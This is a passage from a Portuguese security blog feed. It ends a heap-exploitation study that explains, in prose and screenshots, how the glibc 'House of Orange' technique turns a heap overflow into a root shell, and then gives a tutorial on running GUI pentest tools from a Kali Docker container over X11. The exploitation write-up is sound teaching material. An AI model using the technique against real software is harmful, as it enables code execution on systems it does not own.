Se seguirmos o campo <code class="language-plaintext highlighter-rouge">_flags</code> da estrutura da <code class="language-plaintext highlighter-rouge">_chain</code>, veremos que esta contém a <em>string</em> “/bin/sh”, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_272.png" alt="_flags sobrescrita_" /></p>

<p>Neste ponto, podemos continuar a execução no GDB e voltar para a tela do script, onde, mesmo com várias mensagens de erro, teremos um <code class="language-plaintext highlighter-rouge">shell</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_273.png" alt="shell obtido" /></p>

<p>E esta é a técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code>.</p>

<blockquote>
  <p>Em resumo, nos aproveitamos de um <em>bug</em> de <em>overflow</em> para diminuir o tamanho do <em>top chunk size field</em> para o menor tamanho possível alinhado com o tamanho de uma <em>page</em>. Depois, fizemos uma requisição muito grande para caber no <em>chunk</em> reduzido.<br />
Isto ativou o código de extenção de <em>top chunk</em> da malloc, que requisita mais memória do kernel. Porém como nós adulteramos o <em>top chunk size field</em>, na perspectiva da malloc, o novo <em>top chunk</em> criado não estava adjacente ao <em>top chunk</em> antigo, fazendo com que a malloc liberasse o <em>top chunk</em> antigo para a <em>unsortedbin</em>. Isto nos deixou com um <em>chunk unsorted</em> como resultado de nosso <em>overflow</em>.<br />
Nos aproveitamos do <em>bug</em> de <em>overflow</em> uma segunda vez, para sobrescrever o “bk” deste <em>chunk unsorted</em>, preparando um <em>unsortedbin attack</em> contra o <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.<br />
Também nos aproveitamos desta oportunidade para forjar um <em>file stream</em> na <em>heap</em>, sobrepondo o <em>top chunk</em> antigo e configurar seu tamanho para <code class="language-plaintext highlighter-rouge">0x60</code> bytes.<br />
Então fizemos uma terceira requisição final para um <em>chunk</em> que não tinha o tamanho de <code class="language-plaintext highlighter-rouge">0x20</code> bytes. A malloc, como não encontrou um <em>chunk</em> com este tamanho nem na lista <em>fast</em> e nem na lista <em>small</em>, começou a procurar na lista <em>unsortedbin</em>, onde encontrou o <em>top chunk</em> antigo. Como o <em>top chunk</em> antigo tinha <code class="language-plaintext highlighter-rouge">0x60</code> bytes de tamanho e também não se encaixava na solicitação, a malloc iniciou o processo de <em>partial unlink</em> ativando o <em>unsortedbin attack</em>.<br />
A malloc então continuou sua busca, seguindo agora o “bk” corrompido que criamos para um <em>chunk</em>  que não existe falhando no processo de checagem, forçando a GLIBC a iniciar o procedimento de abortagem.<br />
Antes de iniciar o procedimento de abortagem, a GLIBC tentou limpar todos os <em>file streams</em> abertos. Ela começou seguindo o <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_IO_list_all</code> corrompido que criamos que levava até a <em>main arena</em>, o <em>pointer</em> que havia sido submetido ao <em>unsortedbin attack</em> e agora continha o endereço da <em>unsortedbin</em> na <em>main arena</em>.<br />
Como a <em>main arena</em> foi considerada como um <em>file stream</em>, a checagem de integridade falhou ao chamar a função <code class="language-plaintext highlighter-rouge">overflow()</code> fazendo com que a função de checagem <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> se movesse para o próximo <em>file stream</em> na lista, seguindo o <em>pointer</em> do campo <code class="language-plaintext highlighter-rouge">_chain</code>.<br />
O <em>pointer</em> contido no campo <code class="language-plaintext highlighter-rouge">_chain</code> sobrepôs o “bk” do <em>smallbin</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes, que continha o início de toda esta série de eventos e também continha nosso <em>file stream</em> falso.<br />
Nós construímos este <em>file stream</em> de forma que passasse por todo o processo de checagem sem erros ativando a função <code class="language-plaintext highlighter-rouge">overflow()</code>. Neste ponto, nosso <em>pointer</em> para a <em>vtable</em> foirjada foi seguido, onde substituímos a função <code class="language-plaintext highlighter-rouge">overflow()</code> pelo endereço da <code class="language-plaintext highlighter-rouge">system()</code>.<br />
A função <code class="language-plaintext highlighter-rouge">overflow()</code> é normalmente chamada com um <em>pointer</em> para seu próprio <em>file stream</em> como primeiro argumento no campo <code class="language-plaintext highlighter-rouge">_flags</code>. Nós substituímos o valor do campo <code class="language-plaintext highlighter-rouge">_flags</code> com a <em>string</em> “/bin/sh”.<br />
Isto resultou numa chamada para <code class="language-plaintext highlighter-rouge">overflow()</code> sendo interpretada como <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, nos retornando um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<p>Este é um exemplo da técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code>, onde exploramos um binário com todas as implementações de segurança padrão foram ativadas.</p>

<h1 id="considerações-finais">CONSIDERAÇÕES FINAIS</h1>

<p>Neste estudo, foram apresentados os princípios da arquitetura de alocação de memória dinâmica e seus objetos, como arenas, listas <em>chunks</em>, alguns de seus processoso como alocação, liberação e desvinculação.</p>

<p>Também foi aprensentado, o princípio, de algumas das técnicas mais primitavas de exploração da memória <em>heap</em>.</p>

<p>Conforme desenvilvido no estudo, fica claro que toda implementação de mitigação, gera uma porção de técnicas diferentes para conseguir seu respectivo <em>bypass</em>.</p>

<p>Além das técnicas apresentadas nesta primeira parte do estudo, existem outras de extrema relevância que serão exploradas subsequentemente em próximas partes do estudo.</p>

<h1 id="referências">REFERÊNCIAS</h1>

<p>ANGELBOY. <strong>HITCON CTF Qual 2016:</strong> House of Orange Write up. ln: Angelboy. <strong>4ngelboy</strong>. EUA, 12 dez. 2016. Disponível em: <a href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" title="HITCON CTF Qual 2016">https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a>. Acesso em: 13 abr. 2022.</p>

<p>Anônimo. <strong>Once upon a free()</strong>. [S. l.], 2001. Disponível em: <a href="http://phrack.org/issues/57/9.html" title="Once upon a free()">http://phrack.org/issues/57/9.html</a>. Acesso em: 06 abr. 2022.</p>

<p>GCC. <strong>ABI Policy and Guidelines</strong>. [S. l.], 2022. Disponível em: <a href="https://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html" title="ABI Policy and Guidelines">https://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html</a>. Acesso em: 06 abr. 2022.</p>

<p>GNU. <strong>GNU C Library</strong>. [S. l.], 2022. Disponível em: <a href="https://gnu.org/software/libc/" title="GNU C Library">https://gnu.org/software/libc/</a>. Acesso em: 06 abr. 2022.</p>

<p>JP. <strong>Advanced Doug Lea’s malloc exploits</strong>. [S. l.], 2003. Disponível em: <a href="http://phrack.org/issues/61/6.html" title="Advanced Doug Lea's malloc exploits">http://phrack.org/issues/61/6.html</a>. Acesso em: 06 abr. 2022.</p>

<p>K-sPecial. <strong>The House of Mind</strong>. [S. l.], 2007. Disponível em: <a href="http://www.exploit-db.com/papers/13112" title="The House of Mind">www.exploit-db.com/papers/13112</a>. Acesso em: 06 abr. 2022.</p>

<p>KAMPER, Max. <strong>HeapLab:</strong> GLIBC Heap Exploitation Bible. EUA: HeapLab, v. a, 2021.</p>

<p>Maxx. <strong>Vudo malloc tricks</strong>. [S. l.], 2001. Disponível em: <a href="http://phrack.org/issues/57/8.html" title="Vudo malloc tricks">http://phrack.org/issues/57/9.html</a>. Acesso em: 06 abr. 2022.</p>

<p>N1570: ISO/IEC 9899:201x. C11. EUA: Committee Draft, 2011. Programming languages – C. Disponível em: <a href="https://port70.net/~nsz/c/c11/n1570.html">port70.net/~nsz/c/c11/n1570.html</a>. Acesso em: 06 abr. 2022.</p>

<p><strong>ONE</strong>, Aleph. <strong>Smashing The Stack For Fun And Profit</strong>. [S. l.], 1997. Disponível em: <a href="http://phrack.org/issues/49/14.html" title="Smashing The Stack For Fun And Profit">http://phrack.org/issues/49/14.html</a>. Acesso em: 06 abr. 2022.</p>

<p>PHANTASMAGORIA, Phantasmal. <strong>Malloc Maleficarum</strong>. [S. l.], 2005. Disponível em: <a href="https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Heap%20Bug%20-%20Exploiting%20the%20wilderness%20-%20Phantasmal%20Phantasmagoria.txt" title="Malloc Maleficarum">repository.root-me.org/</a>. Acesso em: 06 abr. 2022.</p>]]></content><author><name>H41stur</name></author><category term="Papers" /><category term="Heap Exploitation" /><category term="Linux" /><category term="Binary Exploitation" /><category term="Buffer Overflow" /><category term="Assembly" /><category term="Heap Exploitation" /><summary type="html"><![CDATA[RESUMO]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/papers/heap_p1/heap-logo.png" /><media:content medium="image" url="http://localhost:4000/img/papers/heap_p1/heap-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Executando aplicações GUI em container no Linux</title><link href="http://localhost:4000/ferramentas/tutoriais/2022/04/29/gui-container.html" rel="alternate" type="text/html" title="Executando aplicações GUI em container no Linux" /><published>2022-04-29T01:00:00-03:00</published><updated>2022-04-29T01:00:00-03:00</updated><id>http://localhost:4000/ferramentas/tutoriais/2022/04/29/gui-container</id><content type="html" xml:base="http://localhost:4000/ferramentas/tutoriais/2022/04/29/gui-container.html"><![CDATA[<p>Neste artigo, vamos entender o processo que permite que executemos aplicações que utilizam GUI de dentro de um container.</p>

<p>Este tipo de ação se torna útil no dia-a-dia, ainda falando em sec, pois permite que tenhamos todas as ferramentas necessárias para um teste ou análise de vulnerabilidade, sem que haja a necessidade de instalar ferramentas diretamente no SO ou o uso de virtualização.</p>

<p>O sistema final fica muito leve em comparação a um SO sendo executado em sua totalidade, seja como host ou virtualizado, além de ser extremamente minimalista, instalando somente as ferramentas necessárias. O que o torna performático e isolado do SO host (nem tanto).</p>

<p>Isso nos permite invocar aplicações tanto de terminal quanto GUI integradas ao host. Imagine chamar um <code class="language-plaintext highlighter-rouge">Burpsuite</code> de um container, e interceptar requisições do navegador do host, assim como invocar o <code class="language-plaintext highlighter-rouge">Wireshark</code> do container, para monitorar a rede do host.</p>

<p>O intuito deste artigo, não é demonstrar como funciona o <code class="language-plaintext highlighter-rouge">Docker</code>, ainda mais porque seus recursos são extensos, mas sim demonstrar como podemos utilizá-lo para fins de otimização de testes.</p>

<p>Porém, o que pra muitos pode ser banal, é de extrema importância que abordemos os conceitos básicos envolvidos em todo este processo.</p>

<h1 id="containers">Containers</h1>

<p>Dentro do unverso Linux, um container é uma tecnologia que permite isolar e empacotar uma aplicação e todo o seu ambiente em tempo de execução, ou seja todo o sistema de base e os arquivos necessários para execução de uma aplicação, são executados de forma isolada do sistema operacional.</p>

<p>Isto facilita a movimentação da aplicação em questão, entre diferentes ambientes, pois passa a não depender de bibliotecas e versões de sistemas operacionais específicos. No cenário de desenvolvimento, um container pode transitar entre ambientes de dev, QA e prod mantendo sua integridade completa, independente da infraestrutura de cada ambiente.</p>

<p>Esta independência torna possível a execução de vários processos separadamente uns dos outros tendo melhor aproveitamento dos recursos de hardware e “melhorando” a segurança, ao mentê-los digitalmente em ambientes diferentes.</p>

<h1 id="docker">Docker</h1>

<p><code class="language-plaintext highlighter-rouge">Docker</code> é uma tecnologia que utiliza o <a href="https://www.educative.io/edpresso/what-is-linux-kernel">kernel Linux</a> e seus recursos, para segregar processos de forma que sejam executados de forma isolada e independente. O modelo de implantação do Docker se baseia em imagens, ou seja, para cada sistema e/ou aplicação, existe uma imagem que contém todo o ambiente para seu funcionamento.</p>

<p><img src="/img/posts/gui_docker_01.png" alt="docker" /></p>

<p>Além desta função primordial, o Docker traz uma série de funcionalidades que permitem o fácil gerenciamento dos containers, automatizando implantações, compartilhamento de recursos, arquivos e diretórios entre o container e o host, compartilhamento ou isolamento de redes entre diversos outros.</p>

<p>Entre os benefícios de utilizarmos um gerenciador de containers, podemos citar:</p>

<ul>
  <li>Controle de versões de imagens</li>
  <li>Modularidade</li>
  <li>Escalabilidade</li>
</ul>

<p>Existem outras ferramentas que oferecem as mesmas funcionalidades como <code class="language-plaintext highlighter-rouge">Kubernetes</code> e o <code class="language-plaintext highlighter-rouge">CRI-O</code>. Porém, devido ao seu ambiente “amigável”, vamos focar este artigo em <code class="language-plaintext highlighter-rouge">Docker</code>. Podendo afirmar que a tecnologia Docker tem uma abordagem controlável, baseada em microserviços e eficiente.</p>

<h1 id="x11">X11</h1>

<p><code class="language-plaintext highlighter-rouge">X Window System</code>, também chamado de <code class="language-plaintext highlighter-rouge">X11</code>, é um sistema de janelas <em>client/server</em> para exibição de bitmaps. O X11 é comumente implantado na maioria dos sistemas operacionas baseados em <code class="language-plaintext highlighter-rouge">UNIX</code> e já foi portado até mesmo para outros sistemas.</p>

<p>O <em>server</em> X11, de forma bem resumida, pode ser considerado como o sistema que exibe as janelas e manipula os dispositivos de entrada, como mouses, teclados e telas <em>touch screen</em>. Já os <em>clients</em> são os aplicativos em execução.</p>

<p>O X11 utiliza arquivos <code class="language-plaintext highlighter-rouge">UNIX Socket</code> que agem na comunicação entre processos dentro de uma mesma máquina de forma eficiente. O próprio <a href="https://man7.org/linux/man-pages/man7/unix.7.html">manual do unix socket</a> o descreve como:</p>

<blockquote>
  <p><em>The AF_UNIX (also known as AF_LOCAL) socket family is used to communicate between processes on the same machine efficiently. Traditionally, UNIX domain sockets can be either unnamed, or bound to a filesystem pathname (marked as being of type socket). Linux also supports an abstract namespace which is ndependent of the filesystem.</em></p>
</blockquote>

<p>Assim como vários tipos de servidores, o X11 também trabalha com sistema de permissionamento, do qual pode ser gerenciado pelo comando <code class="language-plaintext highlighter-rouge">xhost</code>.</p>

<p>O <code class="language-plaintext highlighter-rouge">xhost</code> de acordo com seu <a href="https://linux.die.net/man/1/xhost">manual</a> é o programa utilizado para adicionar e deletar <em>host names</em> ou <em>user names</em> da lista de permissões do X <em>server</em>.</p>

<p>Por padrão, o X <em>server</em> permite que somente o usuário local utilize seus recursos, é possível confirmar isso ao executar o comando <code class="language-plaintext highlighter-rouge">sudo xhost</code>.</p>

<p><img src="/img/posts/gui_docker_02.png" alt="docker" /></p>

<p>Conforme podemos ver, somente o usuário logado e seus processos tem permissão de utilizar o X11. Porém, é preciso permitir que toda a família de usuários locais, possam utilizar o X <em>server</em>. Para isso, pode-se utiliar o comando <code class="language-plaintext highlighter-rouge">xhost +local:*</code>.</p>

<p><img src="/img/posts/gui_docker_03.png" alt="docker" /></p>

<p>Como podemos ver, agora temos o <code class="language-plaintext highlighter-rouge">LOCAL</code> entre os usuários permitidos. Esta configuração é resetada toda vez que o sistema operacional é reinicializado.</p>

<p>Além destas configurações, existe uma variável de ambiente extremamente importante neste processo, a <code class="language-plaintext highlighter-rouge">$DISPLAY</code>. Esta variável de ambiente é utilizada pelo X11 para identificar nossos dispositivos de IO e sua interação com a tela. Normalmente esta variável de ambiente contém o valor <code class="language-plaintext highlighter-rouge">:0</code> em dispositivos Desktop, referenciando o monitor primário. Quando se utiliza uma sessão SSH com conexão X, o valor desta variável pode ser um número alto, pois ela indica para o X <em>server</em> que as aplicações devem receber seu <em>input</em> e <em>output</em> de conexões externas. Conforme observado abaixo.</p>

<p><img src="/img/posts/gui_docker_04.png" alt="docker" /></p>

<p>Por ultimo, é preciso encontrar o próprio <code class="language-plaintext highlighter-rouge">UNIX Socket</code> do X <em>server</em>. Este arquivo de socket pode ser encontrado no diretório <code class="language-plaintext highlighter-rouge">/tmp</code> conforme mostrado abaixo.</p>

<p><img src="/img/posts/gui_docker_05.png" alt="docker" /></p>

<p>Normalmente em sistemas baseados em UNIX, toda vez que o X <em>server</em> se inicia junto com o sistema operacional, este diretório é criado.</p>

<h1 id="criando-uma-imagem-personalizada">Criando uma imagem personalizada</h1>

<p>Quando fazemos o <code class="language-plaintext highlighter-rouge">pull</code> de uma imagem Docker, estamos basicamente capturando a imagem que contém somente os arquivos necessários para o funcionamento daquela aplicação. Por exemplo, uma imagem do servidor web <code class="language-plaintext highlighter-rouge">Apache</code>, virá somente com o kernell de uma distribuição Linux e os arquivos necessários para o funcionamento do próprio Apache, tornando a imagem leve o suficiente para ter somente alguns mega bytes.</p>

<p>Já quando fazemos o pull de uma imagem de uma distribuição Linux pura, por exemplo, estamos baixando somente o kernel compilado e um emulador de terminal, tornando a imagem extremamente leve.</p>

<p>Uma imagem de container pode ser usada para criar novas imagens personalizadas que contenha as instalações que precisamos, e cada imagem pode ser usada para o <em>deploy</em> de quantos containers forem necessários. E esta é a grande vantagem em relação ao minimalismo. Uma distribuição que contém somente o necessário e mais nada.</p>

<p>Para a prova de conceito deste artigo, vamos utilizar a imagem da distribuição Kali Linux que pode ser encontrada no <a href="https://hub.docker.com/r/kasmweb/core-kali-rolling">Docker Hub</a>. Esta imagem é atualizada constantemente e contém somente o <em>core</em> do Kali, sem absolutamente nenhuma ferramenta.</p>

<p>Para melhor gerenciamento e controle ao criar uma imagem, um dos recursos do Docker é o <code class="language-plaintext highlighter-rouge">Dockerfile</code>. Basicamente é um arquivo onde configuramos como queremos montar uma imagem, sua referência oficial pode ser encontrada <a href="https://docs.docker.com/engine/reference/builder/">aqui</a>. O script abaixo mostra o conteúdo do exemplo que iremos utilizar.</p>

<div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># informando qual a imagem base a ser utilizada</span>
<span class="k">FROM</span><span class="s"> kalilinux/kali-rolling</span>

<span class="c"># criando um diretório de trabalho</span>
<span class="k">WORKDIR</span><span class="s"> /resources</span>

<span class="c"># update da imagem</span>
<span class="k">RUN </span>apt update

<span class="c"># instalação de aplicações importantes para o X11</span>
<span class="k">RUN </span>apt <span class="nb">install </span>dbus-x11 packagekit-gtk3-module libcanberra-gtk3-0 <span class="nt">-y</span>

<span class="c"># instalando programas de teste</span>
<span class="k">RUN </span>apt <span class="nb">install </span>firefox-esr burpsuite <span class="nt">-y</span>
</code></pre></div></div>

<p>Onde neste arquivo:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">kalilinux/kali-rolling</code>: indica qual a imagem será utilizada como base para uma imagem personalizada</li>
  <li><code class="language-plaintext highlighter-rouge">/resources</code>: será o diretório de trabalho desta imagem, isso significa que toda vez que um container for invocado a partir desta imagem, o diretório principal de trabalho será esse. (podemos montar um volume do host neste diretório para compartilharmos recursos)</li>
  <li><code class="language-plaintext highlighter-rouge">dbus-x11</code>: é o <em>add-on</em> necessário para o D-Bus no X11. O D-Bus é um mecanismo de <em>middleware</em> que permite a comunicação entre multiplos processos executando simultaneamente na mesma máquina. Neste caso, ele fará este papel no X11, entre o host e o container.</li>
  <li><code class="language-plaintext highlighter-rouge">packagekit-gtk3-module</code>: é um pacote de fontes para melhorar a experiência.</li>
  <li><code class="language-plaintext highlighter-rouge">libcanberra-gtk3-0</code>: é a implementação que vai gerar sons de eventos em aplicações GUI, mais um pacote para melhorar a experiência.</li>
</ol>

<p>Como não é possível a interação com o usuário durante a construção de uma imagem, é preciso que todas as instalações possuam a flag <code class="language-plaintext highlighter-rouge">-y</code> para que o não seja solicitada a confirmação. Também é importante que o primeiro comando a ser executado seja o <code class="language-plaintext highlighter-rouge">update</code> da distribuição, para garantir que os pacotes sejam carreegados do repositório.</p>

<p>Para fins de teste, vamos instalar somente o <code class="language-plaintext highlighter-rouge">Firefox</code> e o <code class="language-plaintext highlighter-rouge">Burpsuite</code>, após a comprovação da prova de conceito, podemos montar uma imagem com ferramentas do dia-a-dia.</p>

<p>Com o arquivo configurado, podemos executar o comando <code class="language-plaintext highlighter-rouge">sudo docker build -t kali .</code> de dentro do diretório onde o Dockerfile está.<br />
Neste caso, o <code class="language-plaintext highlighter-rouge">build</code> informa ao Docker para construir uma imagem, a flag <code class="language-plaintext highlighter-rouge">-t</code> diz para o Docker que vamos dar um nome para a imagem, neste caso <code class="language-plaintext highlighter-rouge">kali</code> e o <code class="language-plaintext highlighter-rouge">.</code> indica que é para buscar o Dockerfile no diretório atual.</p>

<p><img src="/img/posts/gui_docker_06.png" alt="docker" /></p>

<p>Como podemos ver, a primeira coisa que o Docker faz, é o <code class="language-plaintext highlighter-rouge">pull</code> da imagem do Kali Linux</p>

<p><img src="/img/posts/gui_docker_07.png" alt="docker" /></p>

<p>Logo após, ele inicia os comandos para <em>update</em> e instalação dos programas, este passo pode demorar um pouco.</p>

<p>Após a execução de todos os processos, podemos consultar as imagens existentes e verificar que a imagem <code class="language-plaintext highlighter-rouge">kali</code> foi criada, conforme mostrado abaixo.</p>

<p><img src="/img/posts/gui_docker_08.png" alt="docker" /></p>

<p>Neste ponto, temos uma imagem de Kali Linux extremamente minimalista para testes que contém somente os programas Firefox e Burpsuite.</p>

<h1 id="invocando-o-bash-de-um-container">Invocando o bash de um container</h1>

<p>Containers são dinâmicos, podem ser criados, destruídos, inicializados, parados, movidos e alterados.<br />
Podemos compartilhar recursos entre o host e um container, assim como podemos isolá-lo totalmente.</p>

<p>Quando inciamos um container, ele vai ler a imagem base e iniciar a aplicação invocada permanecendo em operação até que seja parado de alguma forma. Aí entra uma granda cautela necessária, se invocarmos várias aplicações de uma imagem, vários contaners serão criados e permanecerão em execução consumindo recursos, a menos que sejam parados ou destruídos.</p>

<p>Para lidar com este tipo de situação, podemos utilizar uma série de flags ao invocar um container. Abaixo, exemplifico a forma que <code class="language-plaintext highlighter-rouge">EU</code> utilizo na istuação específica abordada neste artigo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> kali bash
</code></pre></div></div>

<p>Onde:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">run</code>: é o comando para o deploy de um container a partir de uma imagem.</li>
  <li><code class="language-plaintext highlighter-rouge">--rm</code>: esta é a flag importante, ela indica para o Docker, que após o encerramento do programa ou aplicação invocada, este container deve se auto destruir, desocupando a memória e o espaço em disco. Isso faz com que não seja necessária a preocupação com vários containers reduntantes executando em paralelo sem uso e torna as alterações não permanentes, ou seja, o container sempre será executado no estado inicial do Kali.</li>
  <li><code class="language-plaintext highlighter-rouge">-it</code>: a flag que faz o container ficar “interativo” (<code class="language-plaintext highlighter-rouge">-i</code> mantém o STDIN ativo e <code class="language-plaintext highlighter-rouge">-t</code> aloca um pseuto TTY).</li>
  <li><code class="language-plaintext highlighter-rouge">kali</code>: o nome da imagem que utilizaremos para invocar o container.</li>
  <li><code class="language-plaintext highlighter-rouge">bash</code>: o programa que queremos invocar, neste caso um simples terminal bash.</li>
</ol>

<p><img src="/img/posts/gui_docker_09.png" alt="docker" /></p>

<p>Até então, tudo funcionando normalmente como qualquer container, porém, como utilizamos a flag <code class="language-plaintext highlighter-rouge">--rm</code> ao executar o comando <code class="language-plaintext highlighter-rouge">exit</code>, o container se auto destrói e nenhuma alteração é persistente.</p>

<p>Neste primeiro comando, utilizamos o comando <code class="language-plaintext highlighter-rouge">bash</code> para invocar o terminal, mas com todas as configurações que fizemos, podemos agora invocar um programa que utiliza GUI</p>

<h1 id="invocando-um-programa-gui-de-um-container">Invocando um programa GUI de um container</h1>

<p>Conforme entendemos sobre o X11, precisamos compartilhar o recurso de <code class="language-plaintext highlighter-rouge">UNIX Socket</code> que se encontra em <code class="language-plaintext highlighter-rouge">/tmp/</code> entre o container e o host. O Docker, permite que compartilhemos diretórios e arquivos através de volumes, com este recurso, podemos “montar” um diretório do host em qualquer lugar do container.<br />
Também precisamos compartilhar a variável de ambiente <code class="language-plaintext highlighter-rouge">$DISPLAY</code> que o X11 irá utilizar para saber onde mandar a aplicação GUI. O comando fica desta forma:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="nt">-e</span> <span class="nv">DISPLAY</span><span class="o">=</span><span class="nv">$DISPLAY</span> <span class="nt">-d</span> kali firefox
</code></pre></div></div>

<p>Onde:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">-v /tmp/.X11-unix:/tmp/.X11-unix</code>: a flag <code class="language-plaintext highlighter-rouge">-v</code> monta um volume da máquina host para um diretório do container, no caso estamos montando o diretório <code class="language-plaintext highlighter-rouge">/tmp/.X11-unix</code> do host para o mesmo caminho dentro do container.</li>
  <li><code class="language-plaintext highlighter-rouge">-e DISPLAY=$DISPLAY</code>:  a flag <code class="language-plaintext highlighter-rouge">-e</code> cria uma variável de ambiente no container com o valor que passarmos, no caso estamos criando a <code class="language-plaintext highlighter-rouge">DISPLAY</code> dentro do container com o mesmo valor da <code class="language-plaintext highlighter-rouge">DISPLAY</code> do host.</li>
  <li><code class="language-plaintext highlighter-rouge">-d</code>: esta flag faz com que a execução ocorra em background sem comprometer o terminal.</li>
</ol>

<p>Ao executar o comando, temos o Firefox invocado diretamente do container.</p>

<p><img src="/img/posts/gui_docker_10.png" alt="docker" /></p>

<p>Todo este processo, torna o container menos isolado do host, porém o objetivo desta prova de conceito não é subir uma aplicação, mas sim chamar aplicações GUI que possam ajudar no dia-a-dia sem que haja a necessidade da instalação na máquina host.</p>

<p>Ainda é possível compartilhar mais recursos com o container, para interagir com o host, por exemplo, podemos compartilhar as mesmas interfaces de rede do host com o container, e utilizar o Burpsuite do container para interceptar requisições do browser do host, podemos fazer isto com a flag <code class="language-plaintext highlighter-rouge">--net=host</code>. O comando fica desta forma:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="nt">-e</span> <span class="nv">DISPLAY</span><span class="o">=</span><span class="nv">$DISPLAY</span> <span class="nt">--net</span><span class="o">=</span>host <span class="nt">--privileged</span> <span class="nt">-d</span> kali burpsuite
</code></pre></div></div>

<p>Ao executar o comando e chamar o Firefox do host, podemos interagir entre as aplicações.</p>

<p><img src="/img/posts/gui_docker_11.png" alt="docker" /></p>

<p>Caso seja necessário persistir algum dado, ou compartilhar algum arquivo ou diretório entre o container e o host, podemos utilizar a flag <code class="language-plaintext highlighter-rouge">-v</code> novamente e montar um novo compartilhamento. Na verdade, esta foi a real razão da qual o comando <code class="language-plaintext highlighter-rouge">WORKDIR /resource</code> foi inserida no <code class="language-plaintext highlighter-rouge">Dockerfile</code>, pois podemos montar um diretório compartilhado lá de forma mais organizada.</p>

<h1 id="automatizando-a-chamada">Automatizando a chamada</h1>

<p>Como o comando fica relativamente grande, fiz um script para automatizar esta chamada onde, a depender do argumento, ele toma uma ação diferente, como chamar um terminal ou abrir uma aplicação GUI.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">dir</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/
<span class="nv">xh</span><span class="o">=</span><span class="si">$(</span><span class="nb">sudo </span>xhost | <span class="nb">grep </span>LOCAL | <span class="nb">wc</span> <span class="nt">-l</span><span class="si">)</span>

<span class="k">if</span> <span class="o">[</span> <span class="nv">$xh</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
<span class="k">then
		</span><span class="nb">sudo </span>xhost +Local:<span class="k">*</span> <span class="o">&gt;</span>/dev/null
<span class="k">fi

if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">]</span>
<span class="k">then
		</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Use:</span><span class="se">\n\t</span><span class="nv">$0</span><span class="s2"> &lt;command&gt;"</span>
		<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Ex:</span><span class="se">\n\t</span><span class="nv">$0</span><span class="s2"> bash"</span>
		<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="nv">$0</span><span class="s2"> burpsuite"</span>
<span class="k">elif</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"bash"</span> <span class="o">]</span>
<span class="k">then
		</span><span class="nb">sudo </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">-v</span> <span class="nv">$dir</span>:/resources <span class="nt">-v</span> /tmp/.X11-unix/:/tmp/.X11-unix/ <span class="nt">--net</span><span class="o">=</span>host <span class="nt">--privileged</span> <span class="nt">-e</span> <span class="nv">DISPLAY</span><span class="o">=</span><span class="nv">$DISPLAY</span> kali <span class="nv">$1</span>
<span class="k">else
		</span><span class="nb">sudo </span>docker run <span class="nt">--rm</span> <span class="nt">-v</span> <span class="nv">$dir</span>:/resources <span class="nt">-v</span> /tmp/.X11-unix/:/tmp/.X11-unix/ <span class="nt">--net</span><span class="o">=</span>host <span class="nt">-e</span> <span class="nv">DISPLAY</span><span class="o">=</span><span class="nv">$DISPLAY</span> <span class="nt">--privileged</span> <span class="nt">-d</span> kali <span class="nv">$1</span> <span class="o">&gt;</span>/dev/null
<span class="k">fi</span>
</code></pre></div></div>
<p>Este script nos permite chamar tanto o bash:</p>

<p><img src="/img/posts/gui_docker_12.png" alt="docker" /></p>

<p>Como chamar uma aplicação GUI:</p>

<p><img src="/img/posts/gui_docker_13.png" alt="docker" /></p>

<h1 id="melhorando-a-utilidade">Melhorando a utilidade</h1>

<p>Neste artigo, fizemos um treste simples ao criar uma imagem que contém somente o Firefox e o Burpsuite, porém, esta imagem pode ser construida com toda e qualquer <em>tool</em>  necessária para o dia-a-dia, tanto com aplicações GUI quanto programas de terminal tornando versátil o uso do Kali Linux em ambientes distintos. Tudo a depender de como o Dockerfile é configurado.</p>

<p>Eu fiz um repositório no GitHub com a construção e automação deste recurso com algumas ferramentas mais habituais, o recurso pode ser encontrado no link abaixo:</p>

<ul>
